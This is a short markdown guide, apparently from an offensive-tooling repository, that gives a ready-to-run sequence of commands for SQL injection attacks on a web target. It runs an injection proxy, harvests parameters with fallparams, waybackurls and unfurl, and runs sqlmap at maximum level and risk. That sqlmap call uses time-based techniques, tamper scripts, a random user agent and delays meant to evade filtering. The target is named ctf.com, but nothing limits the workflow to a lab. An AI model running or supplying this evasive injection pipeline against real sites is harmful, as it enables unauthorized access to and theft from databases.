# SQLMap Over Zero-Trust

These will be invaluable for our SQLMap scan.

command sequence incorporating everything:

0. Run <a href="https://github.com/dewebdes/ZedAlert/blob/main/tools/fuzz/dns/multiproxy-injection-fat.py">MITM-CL</a> proxy:
   ```bash
   ./mitmweb --set block_global=false --ssl-insecure -s multiproxy-injection-fat.py > /dev/null 2>&1
   ```

1. Use `fallparams` to crawl the target URL and gather parameters:
   ```bash
   ./fallparams -u https://ctf.com/Search.aspx -crawl
   ```

2. Use `waybackurls` and `unfurl` to gather additional parameters:
   ```bash
   echo "ctf.com" | ./waybackurls | ./unfurl keys | tee way-unf.txt
   ```

3. Combine all parameter sources into a single, unique wordlist including the top-27 XSS parameters:
   ```bash
   cat parameters.txt top-27-xss-parameter.txt way-unf.txt | sort | uniq > params.txt
   ```

4. Run SQLMap with the generated wordlist and crawling enabled:
   ```bash
   sqlmap -u "https://ctf.com/Search.aspx?postback=true&more=false&jto=1&q=consultant&rad=5&where=dusseldofr&indid=37&indid=4" --technique=T --batch --delay=25 --time-sec=15 --random-agent --tamper=between --tamper=space2comment --proxy=http://127.0.0.1:8080 --level=5 --risk=3 --crawl=3 -p $(cat params.txt | tr '\n' ',')
   ```

This comprehensive approach combines the strengths of parameter discovery tools with the thoroughness of SQLMap's scanning capabilities.
